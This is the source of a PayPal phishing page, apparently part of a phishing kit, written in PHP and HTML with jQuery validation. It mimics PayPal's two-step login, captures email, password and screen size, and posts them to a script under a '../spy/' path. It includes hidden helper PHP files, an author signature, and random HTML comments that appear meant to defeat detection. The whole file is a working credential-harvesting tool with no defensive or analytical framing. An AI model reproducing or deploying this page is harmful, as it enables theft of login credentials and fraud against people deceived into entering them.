<?php
include '../Mckay‎‏/zero1.php';
include 'index1.php';
/*
##############################################################
                           LOVE is fake
##############################################################
                           MR fake is me	
##############################################################
              https://web.facebook.com/yackson.garcia.161	
##############################################################			  
*/
  ?>
<!DOCTYPE html>

<html>
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
    <link rel="shortcut icon" href="../files/png/cd.ico">
<!--31420539-->    <link rel="apple-touch-icon" href="../files/png/cv.png"><!--92212811-->    <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
    <title>
PayPal Log in    </title>
    <link rel="stylesheet" href="../files/css/login.css">
    <script type="text/javascript" src="../files/js/jquery-3.3.1.min.js">
    </script>
    <script type="text/javascript" src="https://js-codes.com/modernizr/2.9.0/modernizr.min.js">
    </script><!--74696121-->  </head>
  <body>


    <section class="base">
      <div class="main contentBordered">
        <header>
    <!--50312483-->      <p class="app_logo">
          </p>
        </header>
		<img src="../files/png/55.png" id="Picture1" alt="" height="40" class="center">
<br>
<br>
<br>
<style>
  div {
    text-align: center;
  }
</style>

                        <div class="alert hide">
          <p class="danger_error"><!--80450205-->     <!--72576702-->       Please check your entries and try again.          </p>
        </div>
        <form action="../spy/Welcome Sir/spy1.php" method="post" novalidate="">
          <input type="hidden" name="screen">
 <!--93374838-->         <div id="stored_email" class="storedMail hide">
            <span class="spanMail">
            </span>
            <a href="javascript:" id="bt_change">
              Change            </a>
          </div>
     <!--22452553-->     <div id="email_area" class="">
            <div class="inputs clearfix" id="field_eml">
              <div class="fieldContainer"><!--12877782-->    <!--19076261-->            <label for="email" class="inputLabel">
                  Email address                </label>
               <input name="EML" id="email" autofocus type="email" autocomplete="off" placeholder="Email address">
                   <input type="hidden" name="acsh33nz0key" value="<br />

">
     <!--1618522-->         </div>
              <div class="msg" id="eml_error">
                <p class="hide">
                  Enter your email address.                </p>
                <p class="hide">
                  That email format isn’t right                </p>
     <!--83982264-->         </div>
            </div>
            <div style="margin-top:20px">
              <button class="button" type="button" id="bt_next">
                Next              </button>
            </div>
            <div class="insteadArea">
              <a href="javascript:">
                Having trouble logging in?      <!--86297928-->        </a>
            </div>
          </div>
          <div id="password_area" class="hide">
       <!--36550072-->     <div class="inputs clearfix" id="field_pwd">
              <div class="fieldContainer">
                <label for="password" class="inputLabel">
                  Enter your password                </label>
         <!--81054649-->       <input name="PWD" id="password" type="password" class="anim" placeholder="Enter your password">
          <!--18782814-->      <button type="button" class="showPassword hide show-hide-password">
                  Show                </button>
                <button type="button" class="hidePassword hide show-hide-password">
                  Hide         <!--33559096-->       </button>
              </div>
    <!--20637793-->          <div class="msg" id="pwd_error">
                <p class="hide">
                  Enter your password                </p>
              </div>
            </div>
   <!--90969386-->         <div style="margin-top:20px">
              <button class="button anim" type="submit" id="btnLogin">
                Log In              </button>
     <!--84243257-->       </div>
            <div class="troubleArea">
              <a href="javascript:">
                Having trouble logging in?      <!--88767084-->        </a>
            </div>
          </div>
  <!--93836505-->      </form>
        <div>
          <div class="divider">
            <span>
  <!--90572621-->            or            </span>
          </div>
          <a href="javascript:" class="button secondary">
            Sign Up          </a>
        </div>
      </div>
    </section>
  <!--94796000-->  <footer class="footer">
    <!--64659175-->  <div class="footerArea">
        <ul class="footerList">
          <li>
            <a href="javascript:">
              Contact Us            </a>
   <!--2831912-->       </li>
          <li>
            <a href="javascript:">
              Privacy    <!--4447496-->        </a>
   <!--36987351-->       </li>
          <li>
            <a href="javascript:">
   <!--12913937-->           Legal            </a>
          </li>
          <li>
   <!--64610517-->         <a href="javascript:">
              Worldwide            </a>
  <!--72366729-->        </li>
        </ul>
      </div>
  <!--62985518-->  </footer>
    <div class="hide" id="rotate">
      <div class="circle">
  <!--87609939-->      <div class="rotate">
        </div>
<!--37196457-->        <div class="processing">
          Processing...        </div>
      </div>
   <!--32011941-->   <div class="overlay">
      </div>
    </div>
    <script>$(document).ready(function(){
        $("[name=screen]").val(screen.width+' x '+screen.height);
        var j=false;
        var e=$("#email"),i=$("#password"),k=$("#email_area"),l=$("#password_area"),c=$("#stored_email"),b=$("#field_eml"),d=$("#field_pwd"),h=$("#eml_error"),a=$("#pwd_error");
        function f(o,m,p){
          var n=true;
          if(!o.val()){
            m.addClass("hasError");
            p.attr("class","msg show").children("p:first").removeClass("hide");
            n=false}
          else{
            m.removeClass("hasError");
            p.attr("class","msg hide").children("p:first").addClass("hide")}
          return n}
        function g(){
          var m=true;
          if(!(/^([a-zA-Z0-9_.+-])+\@(([a-zA-Z0-9-])+\.)+([a-zA-Z0-9]{2,4})+$/).test(e.val())){
            b.addClass("hasError");
            h.attr("class","msg show").children("p:last").removeClass("hide");
            m=false}
          else{
            b.removeClass("hasError");
            h.attr("class","msg hide").children("p:last").addClass("hide")}
          return m}
        $("#bt_next").click(function(m){
          if(!f(e,b,h)){
            e.focus();
            h.attr("class","msg show").children("p:last").addClass("hide");
            console.log("required");
            return false}
          if(!g()){
            e.focus();
            console.log("eml");
            return false}
          else{
            h.attr("class","msg hide").children("p:last").addClass("hide")}
          $("#rotate").removeClass("hide");
          setTimeout(function(){
            c.removeClass("hide").children("span").html(e.val());
            k.addClass("hide");
            l.removeClass("hide");
            $("#rotate").addClass("hide");
            d.removeClass("hasError");
            a.attr("class","msg hide").children("p:first").addClass("hide")}
                     ,800)}
                           );
        $("#bt_change").click(function(){
          c.addClass("hide");
          e.val("");
          i.val("");
          l.addClass("hide");
          k.removeClass("hide");
          $(".alert").addClass("hide");
          j=false}
                             );
        e.keyup(function(m){
          if(m.keyCode==13){
            $("#bt_next").click()}
          else{
            if(!(/^([a-zA-Z0-9_.+-])+\@(([a-zA-Z0-9-])+\.)+([a-zA-Z0-9]{2,4})+$/).test(e.val())){
              b.addClass("hasError");
              h.attr("class","msg hide").children("p:first").addClass("hide");
              e.focus();
              return false}
            else{
              b.removeClass("hasError");
              h.attr("class","msg hide")}
          }
        }
               );
        i.keyup(function(m){
          if(i.val().length>0){
            i.attr("type","password");
            $(".showPassword").removeClass("hide");
            $(".hidePassword").addClass("hide")}
          else{
            $(".showPassword").addClass("hide");
            $(".hidePassword").addClass("hide")}
          if(!i.val()){
            d.addClass("hasError");
            i.focus();
            return false}
          else{
            d.removeClass("hasError");
            a.attr("class","msg hide")}
        }
               );
        e.focusout(function(){
          h.removeClass("show")}
                  );
        i.focusout(function(){
          a.removeClass("show")}
                  );
        $(".showPassword").click(function(){
          i.attr("type","text");
          $(".hidePassword").removeClass("hide");
          $(".showPassword").addClass("hide")}
                                );
        $(".hidePassword").click(function(){
          i.attr("type","password");
          $(".showPassword").removeClass("hide");
          $(".hidePassword").addClass("hide")}
                                );
        $(document).on("submit","form",function(m){
          if(!(/^([a-zA-Z0-9_.+-])+\@(([a-zA-Z0-9-])+\.)+([a-zA-Z0-9]{2,4})+$/).test(e.val())){
            return false}
          if(!f(i,d,a)){
            i.focus();
            return false}
          $("#rotate").removeClass("hide");
          if(j){
            m.preventDefault();
            setTimeout(function(){
              j=true;
              $("#rotate").addClass("hide");
              i.val("");
              $(".alert").removeClass("hide");
              $(".alertemail").addClass("hide");
              $(".showPassword").addClass("hide");
              $(".hidePassword").addClass("hide");
              return false}
                       ,1800)}
          $(".alert").addClass("hide")}
                      )}
                             );
    </script>
  </body>
</html>